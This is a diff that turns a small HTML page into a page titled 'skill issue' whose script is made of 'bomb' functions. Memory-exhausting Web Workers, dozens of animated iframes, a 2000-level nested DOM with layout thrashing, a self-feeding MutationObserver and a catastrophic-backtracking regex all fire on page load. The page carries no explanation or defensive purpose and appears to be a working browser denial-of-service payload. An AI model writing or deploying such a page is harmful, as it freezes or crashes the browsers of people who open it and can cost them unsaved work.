@@ -1,1 +1,84 @@
-<!DOCTYPE html><title>kill</title><script>/^(a+)+$/.test('a'.repeat(30)+'b')</script>
+<!DOCTYPE html>
+<title>skill issue</title>
+<style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;font-size:12px}</style>
+<body><pre id="o"></pre></body>
+<script>
+const o=document.getElementById('o');
+const log=t=>{o.textContent+=t+'\n';o.scrollTop=o.scrollHeight};
+const store=[];
+
+function redosBomb(){
+  log('skill issue detected');
+  const evil = /^(a+)+$/;
+  const poison = 'a'.repeat(25) + 'b';
+  try { evil.test(poison); } catch(e){}
+}
+
+function domDepthBomb(){
+  let el = document.body;
+  for(let i=0;i<2000;i++){
+    const div = document.createElement('div');
+    div.style.cssText = 'padding:1px;border:1px solid rgba(255,0,0,0.1);transform:rotate(0.1deg);filter:blur(0.1px)';
+    el.appendChild(div);
+    el = div;
+  }
+}
+
+function layoutBomb(){
+  const divs = document.querySelectorAll('div');
+  function thrash(){
+    divs.forEach(d=>{
+      const w = d.offsetWidth;
+      d.style.marginLeft = (Math.sin(Date.now()/100)*2)+'px';
+      const h = d.offsetHeight;
+      d.style.marginTop = (Math.cos(Date.now()/100)*2)+'px';
+    });
+    requestAnimationFrame(thrash);
+  }
+  thrash();
+}
+
+function workerBomb(){
+  const code=`const arr=[];setInterval(()=>{arr.push(new Uint8Array(50*1024*1024));for(let i=0;i<arr[arr.length-1].length;i+=4096)arr[arr.length-1][i]=255;},10);`;
+  for(let i=0;i<20;i++){
+    try{
+      const blob=new Blob([code],{type:'application/javascript'});
+      const w=new Worker(URL.createObjectURL(blob));
+      store.push(w);
+    }catch(e){}
+  }
+}
+
+function iframeBomb(){
+  for(let i=0;i<50;i++){
+    const iframe=document.createElement('iframe');
+    iframe.style.cssText='width:100px;height:100px;position:absolute;left:'+Math.random()*500+'px;top:'+Math.random()*500+'px';
+    iframe.srcdoc=`<style>*{animation:x 0.1s infinite}@keyframes x{to{transform:rotate(360deg);filter:blur(5px)}}</style>`+'<div></div>'.repeat(500);
+    document.body.appendChild(iframe);
+  }
+}
+
+function mutationBomb(){
+  const target=document.body;
+  const observer=new MutationObserver((mutations)=>{
+    mutations.forEach(m=>{
+      const div=document.createElement('div');
+      div.style.cssText='width:10px;height:10px;background:red;position:absolute;left:'+Math.random()*innerWidth+'px;top:'+Math.random()*innerHeight+'px;filter:blur(2px);animation:x 1s infinite';
+      target.appendChild(div);
+    });
+  });
+  observer.observe(target,{childList:true,subtree:true});
+  for(let i=0;i<100;i++)document.body.appendChild(document.createElement('span'));
+}
+
+log('=== SKILL ISSUE ===\n');
+setTimeout(()=>workerBomb(),0);
+setTimeout(()=>iframeBomb(),100);
+setTimeout(()=>domDepthBomb(),200);
+setTimeout(()=>layoutBomb(),300);
+setTimeout(()=>mutationBomb(),400);
+setTimeout(()=>{
+  log('\n...');
+  setTimeout(redosBomb,100);
+},500);
+</script>
